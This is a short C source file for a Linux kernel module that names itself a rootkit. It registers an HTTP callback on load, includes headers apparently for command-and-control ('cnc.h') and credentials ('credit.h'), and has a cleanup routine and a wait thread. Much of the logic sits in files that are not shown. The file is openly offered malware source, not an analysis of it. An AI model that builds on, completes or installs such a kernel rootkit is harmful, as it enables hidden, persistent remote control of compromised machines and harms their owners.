#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/delay.h>

#include "credit.h"
#include "cnc.h"
#include "debug_helper.h"

void clean_rootkit ( void );
void quiter (char * busy);
int init_rootkit ( void );

int init_rootkit ( void )
{
	dbg_print("init_rootkit.");

	set_http_callback();
	
	return 0;
}

int quiter_thread (void * is_busy)
{
	char * busy = (char *)is_busy; 
	if (!busy)
	{
		dbg_err_print("Something get really wrong!");
	}
	else 
	{
		while((*busy))
		{
			msleep(10);
		}
		dbg_print("clean_rootkit().");	
		//clean_rootkit();
	}
	do_exit(0);
}

void clean_rootkit ( void )
{
	dbg_print("clean_rootkit.");
	
	unset_http_callback();
}


module_init(init_rootkit);
module_exit(clean_rootkit);
